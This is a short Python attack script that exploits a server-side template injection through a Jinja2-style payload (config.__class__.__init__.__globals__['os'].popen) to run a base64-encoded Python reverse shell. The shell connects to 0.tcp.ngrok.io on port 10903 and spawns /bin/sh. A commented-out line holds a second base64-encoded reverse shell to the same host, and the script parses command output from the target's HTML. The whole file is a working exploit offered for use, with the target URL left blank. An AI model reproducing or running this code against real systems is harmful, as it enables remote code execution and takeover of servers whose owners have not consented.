import requests
import base64
cd = "cd .;"
while(1):
    url = ""
    # cmd = input(">> ")
    # if(cmd.split(" ")[0] == "cd"):
    #     cd = cmd + ";"
    # cmd = cd+cmd

    var = base64.b64encode(
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.ngrok.io\",10903));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".encode())
    # var = base64.b64encode("python -c \"exec('aW1wb3J0IHNvY2tldCwgICAgICBzdWJwcm9jZXNzLCAgICAgIG9zICAgOyAgICAgICBob3N0PSIwLnRjcC5uZ3Jvay5pbyIgICA7ICAgICAgIHBvcnQ9MTA5MDMgICA7ICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgOyAgICAgICBzLmNvbm5lY3QoKGhvc3QsICAgICAgcG9ydCkpICAgOyAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgMCkgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAxKSAgIDsgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgIDIpICAgOyAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))\"".encode())
    param = "{{config.__class__.__init__.__globals__['os'].popen('echo \"%s\" | base64 -d | sh 2>&1').read()}}" % (
        var.decode())

    r = requests.get(url+param)
    print(r.text.split("<!-- o que os olhos não vêem o coração não sente, será ? -->")
          [1].split("<!-- ")[1].split("-->")[0].replace("&amp;#34;", "\"").replace(" & amp;  # 39;", "\'").replace("&amp;lt;", "<").replace("&amp;gt;", ">"))
